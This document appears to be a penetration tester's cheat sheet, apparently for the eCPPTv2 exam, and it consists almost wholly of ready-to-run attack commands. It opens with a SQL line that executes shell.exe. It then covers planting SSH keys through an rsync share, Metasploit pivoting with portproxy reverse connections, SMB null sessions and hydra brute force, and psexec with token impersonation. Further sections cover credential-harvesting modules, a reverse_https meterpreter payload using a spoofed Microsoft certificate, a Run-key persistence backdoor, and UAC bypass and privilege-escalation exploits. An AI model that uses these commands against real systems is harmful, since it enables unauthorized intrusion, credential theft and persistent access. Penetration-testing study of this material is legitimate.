CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Users\\Tony\\Desktop\\shell.exe").getInputStream()).useDelimiter("\\Z").next()');
# CHINESE
```bash
https://www.cnblogs.com/littlehann/p/3522990.html
```
# RSYNC
```bash
List the shares
rsync -av --list-only rsync://192.168.66.126/fox
Copy the files
rsync -av rsync://192.168.66.126:873/fox .

Copy keys and ssh in the box:
First make a .ssh folder on the victim.
mkdir .ssh
sudo rsync -av --relative ./.ssh  rsync://192.168.66.126/fox/ (now there is a .ssh file for sure that we can put the authorized_keys in)
Now make your keys
ssh-keygen -f ./authorized_keys -t ed25519
mv authorized_keys id_rsa
mv authorized_keys.pub authorized_keys
sudo rsync -av /home/bruiser/Tools/rsync/.ssh/authorized_keys rsync://192.168.66.126/fox/.ssh/
ssh -i id_rsa fox@192.168.66.126
```
```bash
Invoke the ps1 in the web request and run it in session to bybass security
```
##### Pivot
```bash
echo %userdomain%
```
# eCPPTv2

# Pivot
```bash
On target
run arp_scanner -r 10.10.10.0/24

PIVOT
use post/manage/autoroute
meterpreter > run autoroute -s 172.30.111.0/24
meterpreter > background
msf exploit(psexec) > use auxiliary/scanner/portscan/tcp

### USE THE EXPLOITED MACHINE AS A BRIDGE
```bash
use post/manage/autoroute
route print
use auxiliary/server/socks_proxy
     Set our proxy SRVHOST value to be that of our VPN tunnel IP address, and run the module:

sudo nano /etc/proxychains.conf
(last line) socks4 127.0.0.1 1080
proxychains iceweasel (for browser)

Now turn on the proxy in the web browser config to the VPN Tunnel address with the correct socks 4a
Browse like normal

NOW TO GET THE MACHINE TO BE ABLE TO CONNECT BACK TO US

modify the default RPORT option to be that of the TCP port 8443
LHOST to be that of the pivot machine's external IP 172.16.80.100

use post/windows/manage/portproxy
msf post(windows/manage/portproxy) > set CONNECT_ADDRESS 175.12.80.21 (My VPN)
msf post(windows/manage/portproxy) > set CONNECT_PORT 4444 (Whatever)
msf post(windows/manage/portproxy) > set LOCAL_ADDRESS 10.100.11.101 (What machine I am using to pivot)
msf post(windows/manage/portproxy) > set LOCAL_PORT 4444 (Whatever)
msf post(windows/manage/portproxy) > set SESSION 1
msf post(windows/manage/portproxy) > run

NOW I AM ON THE SYSTEM BUT INORDER TO REACH BY TO KALI I NEED TO SET UP ANOTHER PORT PROXY RULE
(All same but change the port and use the port for the attack)
msf post(windows/manage/portproxy) > set CONNECT_ADDRESS 175.12.80.21 (My VPN)
msf post(windows/manage/portproxy) > set CONNECT_PORT 4444 (Whatever)
msf post(windows/manage/portproxy) > set LOCAL_ADDRESS 10.100.11.101 (What machine I am using to pivot)
msf post(windows/manage/portproxy) > set LOCAL_PORT 4444 (Whatever)
msf post(windows/manage/portproxy) > set SESSION 1
msf post(windows/manage/portproxy) > run

Now use that new port as the port and use the pivot box as the IP


ADD PORT FORWARD RULE
meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.200 (or whatever you want to get to)

OR
meterpreter > run autoroute -s 10.32.121.0/24
```

### Machine cant reach back over internet
```bash
use post/windows/manage/autoroute
set session 1
set subnet 10.10.11.0
run
use post/windows/manage/autoroute
set subnet 10.10.10.0
run
route print
Active Routing Table
====================

 Subnet          Netmask          Gateway
 ------          -------          -------
 10.10.10.0      255.255.255.0    Session 1
 10.10.11.0      255.255.255.0    Session 1

Now change LHOST to vicim 1
```
```
##### RECON The Target NET
```bash
ping sweep
nmap -sn 10.50.96.0/23
Host Discovery - No Ping
nmap -n -sn -PS22,135,443,445 10.50.96.0/23
DNS Discovery
nmap -sS -sU -p53 -n 10.50.96.0/23

Name Sever
1) >>nslookup
2) >>server 10.50.96.5
3) >>set q=NS
4) >>foocampus.com
foocampus.com nameserver = ns.foocampus.com.
foocampus.com nameserver = ns1.foocampus.com.
>> nslookup 
>> server 10.50.96.5 
>> ns.foocampus.com
>> ns1.foocampus.com

MX Record
>> nslookup
>> server 10.50.96.5
>> set q=MX
>> foocampus.com

Dig
>>dig @10.50.96.5 foocampus.com -t AXFR +nocookie
>>host -t axfr foocampus.com 10.50.96.5

nslookup target.com ------------------ dig target.com +short
nslookup -type=PTR target.com -------- dig target.com PTR
nslookup -type=MX target.com --------- dig target.com MX
nslookup -type=NS target.com --------- dig target.com NS
nslookup ----------------------------- dig axfr @target.com target.com
> server target.com
> ls -d target.com 
whois.icann.org

Bing IP filter
ip:199.111.11.123
Domaintools
DNSlytics
Networkappers
Robtex
```
##### Social Media
```bash
www.pipl.com
spokeo
peoplefinders
CrunchBase
usenet
newsgroups
```
##### Fierce and Maltigo
```bash
Top choice while performing DNS enumeration
```
##### Enum Tools
```bash
winfo 192.168.1.123 -n
Null Session
net use \\192.168.1.112\IPC$ "" /u:""
rpcclient -N -U "" 192.168.119.112

IDENTIFY USERS
ident-user-enum

ENUMERATE DOMAIN, SHARES, ALL THAT ISH
nullinux.py
```
##### Enum NetBIOS Hacking
```bash
C:\>nbtstat -a 10.130.40.70
nmblookup -A 10.130.40.70
The <20> identifier signifies that the host has file shares enabled.
C:\>net use \\10.130.40.70\IPC$ "" /u:""
C:>net view \\10.130.40.70
smbclient -L //10.130.40.70

https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials
https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt

NEED TO START POSTGRESQL
systemctl enable postgresql
msfdb init
msf > use auxiliary/scanner/smb/smb_login
nmap --script=smb-enum-users -p 445 10.130.40.70 --script-args smbuser=administrator,smbpass=password

EXPLOIT
msf > use exploit/windows/smb/psexec
/home/bruiser/impacket/examples/psexec.py

LOAD INCOGNITO
msf auxiliary(tcp) > sessions -i 1
meterpreter > use incognito
meterpreter > list_tokens -u

meterpreter > impersonate_token eLS-Win7\\Administrator
meterpreter > shell
C:\Windows\system32>net view 172.30.111.10
meterpreter > background
msf auxiliary(tcp) > use auxiliary/scanner/smb/smb_enumshares
msf auxiliary(smb_enumshares) > sessions -i 1
C:\Windows\system32>net use K: \\172.30.111.10\FooComShare
meterpreter > download K:\\ Target -r
```
##### SNMP Analysis
```bash
netdiscover -i tap0 -r 10.10.10.0/24
netdiscover -i tap0 -S -L -f -r 10.10.10.0/24
BRUTEFORCE SNMP
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 10.10.10.5
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes 10.10.10.5
snmpwalk -v 1 -c public 10.10.10.20
hydra -L users.txt -P /usr/share/john/password.lst 10.10.10.20 smb -f -V
With user/pass /home/bruiser/impacket/examples/psexec.py
```
# POST
```bash
meterpreter > run post/windows/gather/enum_applications
meterpreter > run post/windows/gather/credentials/winscp
meterpreter > run post/windows/gather/credential_collector
meterpreter > search -f *kdb -r -d .
meterpreter > screenshot
meterpreter > run post/multi/gather/filezilla_client_cred
meterpreter > run getgui -e
net localgroup "Remote Desktop Users" bruiser /add

INCOGNITO
meterpreter > impersonate_token eLS-Win7\\eLS (You need 2x \\)
```
##### Maping the Internal Network
```bash
arp
route
ipconfig /displaydns
netstat -ano
use /post/multi/gather/ping_sweep
run arp_scanner -r 10.10.10.0/24
```

##### Custom SSL Meterpreter
```bash
use auxiliary/gather/impersonate_ssl
set rhost www.microsoft.com
Copy path to the .pem file
use payload/windows/x64/meterpreter/reverse_https
set handlersscert ctrl c the path to the .pem file
set stagerverifysslcert true
generate -t exe -f /root/ssl_payload.exe

use exploit/multi/handler
set handlersscert ctrl c path to .pem
set stagerverifysslcert true
set payload windows/x64.meterpreter/reverse_https
```
##### Migrate
```bash
set AutoRunScript post/windows/manage/migrate
set AutoRunScript migrate -N svchost.exe
svchost.exe
RUN THE BACKDOOR AFTER RESET
meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -d '"C:\inetpub\ftproot\msf_reverse.exe"' -v msf_reverse
```
##### TELNET
```bash
To get things to run correctly:
runas /user:netadmin (or whatever user) 
```
#SUCCESS PRIVESC
```bash
exploit/windows/local/ms10_015_kitrap0d <> windows 2008 running as www
exploit/windows/local/bypassuac_eventvwr <> windows 7 No hotfixes
        /usr/share/metasploit-framework/data/post/bypassuac-x64.exe
        bypassuac-x64.exe /c C:\Users\eLS\Desktop\msfvenom_reverse_tcp.exe 
```
# QUICK LINUX PRIVESC WINS
```bash
SUID
find / -perm -4000 2>/dev/null

```
# Back to basics
```bash
sudo ip route add 192.168.222.0/24 via 10.175.34.1
